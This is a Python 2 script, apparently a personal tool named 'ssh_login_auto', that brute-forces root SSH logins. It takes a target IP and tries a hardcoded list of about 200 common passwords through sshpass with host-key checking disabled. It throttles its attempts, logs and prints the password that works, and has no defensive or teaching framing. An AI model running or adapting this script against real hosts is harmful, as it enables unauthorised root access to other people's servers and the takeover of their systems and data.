#! /usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ : YiXuan
# __date__ : 2021/4/11 10:01
# __software__ : PyCharm

import logging
import logging.handlers
import os
import sys
import time
import traceback


def init_logger(log_file):
    dir_path = os.path.dirname(log_file)
    try:
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
    except Exception as e:
        pass

    handler = logging.handlers.RotatingFileHandler(log_file, maxBytes=20 * 1024 * 1024, backupCount=10)
    fmt = '%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
    formatter = logging.Formatter(fmt)
    handler.setFormatter(formatter)
    logger_instance = logging.getLogger('logs')
    logger_instance.addHandler(handler)
    logger_instance.setLevel(logging.DEBUG)
    if len(logger_instance.handlers) != 1:
        logger_instance.handlers.pop()
    else:
        pass
    return logger_instance


def install(config, mylog):
    try:
        mylog.info('[+] Start to execute script')
        for command in config['command_lists']:
            index = config['command_lists'].index(command)
            mylog.info('[+] Step {0}, {1}'.format(str(index), command))
            res = os.system(command)
            # 返回值是 0 则成功！
            if res == 0 and index == 2:
                password = command.split(' ')[2]
                mylog.info('[+] password is {0}'.format(password))
                return True
        return False
    except Exception as e:
        mylog.info(str(e))
        mylog.info(str(traceback.format_exc()))  # traceback 模块用于跟踪异常，返回信息。
        return False


def get_web_server():
    '''
    os.system(cmd): 返回值是脚本的退出状态码
    os.popen(cmd): 返回值是脚本执行过程中的输出内容。
    '''
    res = None
    try:
        res = os.popen('netstat -nlp | grep :::80').readlines()
        res = res[0].strip().split('/')[-1]  # 得到当前 占用80端口的服务
    except:
        res = os.popen('netstat -nlp | grep 0.0.0.0:80').readlines()
        res = res[0].strip().split('/')[-1]
    return res


if __name__ == '__main__':
    APP_NAME = 'ssh_login_auto'
    BASE_DIR = os.getcwd() + os.sep

    log_path = '{0}log/'.format(BASE_DIR)
    log_file = '{0}{1}.log'.format(log_path, APP_NAME)
    failed_file_path = '{0}{1}.failed'.format(BASE_DIR, APP_NAME)
    success_file_path = '{0}{1}.success'.format(BASE_DIR, APP_NAME)
    my_log = init_logger(log_file=log_file)

    target_ip = sys.argv[1]
    pwd_list = [
        'admin',
        'admin123',
        'root',
        'root123',
        "123456", "123456789", "111111", "5201314", "12345678", "123123", "password", "1314520", "123321", "7758521",
        "1234567", "5211314", "666666", "520520", "woaini", "520131", "11111111", "888888", "hotmail.com", "112233",
        "123654", "654321", "1234567890", "a123456", "88888888", "163.com", "000000", "yahoo.com.cn", "sohu.com",
        "yahoo.cn", "111222tianya", "163.COM", "tom.com", "139.com", "wangyut2", "pp.com", "yahoo.com", "147258369",
        "123123123", "147258", "987654321", "100200", "zxcvbnm", "123456a", "521521", "7758258", "111222", "110110",
        "1314521", "11111111", "12345678", "a321654", "111111", "123123", "5201314", "00000000", "q123456", "123123123",
        "aaaaaa", "a123456789", "qq123456", "11112222", "woaini1314", "a123123", "a111111", "123321", "a5201314",
        "z123456", "liuchang", "a000000", "1314520", "asd123", "88888888", "1234567890", "7758521", "1234567",
        "woaini520", "147258369", "123456789a", "woaini123", "q1q1q1q1", "a12345678", "qwe123", "123456q", "121212",
        "asdasd", "999999", "1111111", "123698745", "137900", "159357", "iloveyou", "222222", "31415926", "123456",
        "111111", "123456789", "123123", "9958123", "woaini521", "5201314", "18n28n24a5", "abc123", "password",
        "123qwe", "123456789", "12345678", "11111111", "dearbook", "00000000", "123123123", "1234567890", "88888888",
        "111111111", "147258369", "987654321", "aaaaaaaa", "1111111111", "66666666", "a123456789", "11223344",
        "1qaz2wsx", "xiazhili", "789456123", "password", "87654321", "qqqqqqqq", "000000000", "qwertyuiop", "qq123456",
        "iloveyou", "31415926", "12344321", "0000000000", "asdfghjkl", "1q2w3e4r", "123456abc", "0123456789",
        "123654789", "12121212", "qazwsxedc", "abcd1234", "12341234", "110110110", "asdasdasd", "123456", "22222222",
        "123321123", "abc123456", "a12345678", "123456123", "a1234567", "1234qwer", "qwertyui", "123456789a", "qq.com",
        "369369", "163.com", "ohwe1zvq", "xiekai1121", "19860210", "1984130", "81251310", "502058", "162534", "690929",
        "601445", "1814325", "as1230", "zz123456", "280213676", "198773", "4861111",
    ]

    try:
        count = 0
        for pwd in pwd_list:
            count += 1
            if count % 3 == 0:
                time.sleep(5)
            print '[No.{0}] Using pwd: {1} to connect ssh@{2}'.format(count, pwd, target_ip)
            config = dict(
                command_lists=[
                    'rm -rf {0}'.format(failed_file_path),
                    'rm -rf {0}'.format(success_file_path),
                    'sshpass -p {0} ssh -o StrictHostKeyChecking=no root@{1}'.format(pwd, target_ip),
                ],
            )

            result = install(config, my_log)
            if result:
                print 'The right password is: {0}'.format(pwd)
                os.system('touch {0}'.format(success_file_path))
                break
            else:
                print '{0} error!'.format(pwd)
                time.sleep(1)
        else:
            print 'Connecting ssh to {0} failed'.format(target_ip)
            my_log.info('[-] Connecting ssh to {0} failed'.format(target_ip))

    except Exception as e:
        my_log.info(str(e))
        my_log.info(str(traceback.format_exc()))
        with open(failed_file_path, 'w') as f:
            f.write(e)
